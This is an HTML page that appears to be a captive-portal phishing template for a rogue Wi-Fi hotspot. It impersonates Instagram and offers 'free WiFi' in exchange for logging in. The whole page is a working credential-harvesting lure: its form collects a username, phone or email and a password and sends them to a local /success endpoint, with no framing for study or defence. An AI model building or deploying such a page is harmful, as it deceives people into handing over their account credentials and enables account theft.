<!DOCTYPE html>
<html>
<head>
  <title>Instagram Free WiFi</title>
  <meta name="viewport" content="width=device-width, initial-scale=0.75">
  <link rel="icon" href="data:,">
  <link rel="stylesheet" type="text/css" href="instagram_style.css">
</head>
<body>
  <div class="container">
      <div class="box">
          <div class="heading"></div>
          <p>Welcome to testing of our new service! We decided to create free WiFi as thanks to our clients. Now all you need to do is log in with your instagram account.</p>
          <form class="login-form" action="/success">
              <div class="field">
                  <input id="username" type="name" name="username" placeholder="Phone number, username, or email" />
                  <label for="username">Phone number, username, or email</label>
              </div>
              <div class="field">
                  <input id="password" type="password" name="password" placeholder="Password" />
                  <label for="password">Password</label>
              </div>
              <button class="login-button" title="login">Log In</button>
              <p></p>
          </form>
      </div>
  </div>
</body>
</html>
